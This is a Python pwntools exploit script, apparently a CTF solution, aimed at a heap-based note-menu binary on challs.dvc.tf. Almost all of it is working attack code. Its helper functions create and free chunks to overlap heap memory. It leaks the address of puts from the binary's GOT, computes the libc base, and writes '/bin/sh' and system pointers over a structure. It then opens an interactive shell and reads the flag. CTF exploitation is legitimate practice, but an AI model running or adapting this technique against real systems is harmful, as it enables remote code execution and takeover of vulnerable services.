#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('./a.out')

host = args.HOST or 'challs.dvc.tf'
port = int(args.PORT or 2222)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

# -- Exploit goes here --

def add(tSize, cSize, title, content):
    io.sendlineafter('>', '2')
    io.sendlineafter('>', str(tSize))
    io.sendlineafter('>', str(cSize))
    io.sendlineafter('>', title)
    io.sendlineafter('>', content)

def edit(item, content):
    io.sendlineafter('>', '4')
    io.sendlineafter('>', str(item))
    io.sendlineafter('>', content)

def delete(item):
    io.sendlineafter('>', '5')
    io.sendlineafter('>', str(item))

def view(item):
    io.sendlineafter('>', '3')
    io.sendlineafter('>', str(item))
    io.recvuntil('[>] ')
    data = io.recvline().strip()
    return data

io = start()

libc = ELF('dv.libc.6')
for _ in range(3):
    add(20,20,'a','b')


delete(1)
delete(2)
add(50, 20, p64(0x404020), 'b')

data = view(1)
data = u64(data.ljust(8, b'\x00'))


libc.address = data - libc.sym.puts
log.success(f"libc base @ {hex(libc.address)}")

for _ in range(4):
    add(20,20,'a','b')

delete(3)
delete(4)
add(50, 20, b'/bin/sh\x00' * 4 + p64(libc.sym.system) * 2, 'b')

io.sendlineafter('>', '3')
io.sendlineafter('>', '3')
io.sendline('cat flag')
io.interactive()
#book aray @ 0x4040e0

